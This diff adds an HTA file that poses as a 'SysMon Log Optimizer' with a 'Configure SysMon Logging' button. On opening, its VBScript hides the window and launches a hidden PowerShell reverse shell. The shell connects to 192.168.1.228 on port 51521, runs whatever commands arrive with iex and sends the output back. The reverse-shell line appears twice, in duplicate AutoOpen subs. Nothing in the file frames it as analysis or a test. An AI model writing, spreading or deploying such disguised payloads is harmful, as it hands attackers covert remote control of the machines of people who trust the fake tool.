@@ -1,0 +1,35 @@
+<!DOCTYPE HTA>
+<head>
+<title> SysMon Log Optimizer </title>
+<HTA:Application
+        ICON="#"
+        SHOWINTASKBAR="no"
+        SYSMENU="no"
+        CAPTION="no"
+        BORDER="none"
+        APPLICATIONNAME="SysMon Log Optimizer"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+
+>
+</head>
+
+<script language="VBScript">
+window.resizeTo 0,0
+Set objShell = CreateObject("Wscript.shell")
+        Sub AutoOpen()
+                objShell.run("powershell.exe -NoProfile -NonInteractive -WindowStyle hidden $sm=(New-Object Net.Sockets.TCPClient('192.168.1.228',51521)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}")
+        End Sub
+        Private Sub AutoOpen()
+                objShell.run("powershell.exe -NoProfile -NonInteractive -WindowStyle hidden $sm=(New-Object Net.Sockets.TCPClient('192.168.1.228',51521)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}")
+        End Sub
+window.resizeTo 0,0
+AutoOpen
+Close
+</script>
+
+<body>
+<input type="button" value="Configure SysMon Logging" name="run_button" onClick="TestSub"><p>
+<input type="button" value="Cancel" name="run_abutton" onClick="Mine"><p>
+</body>
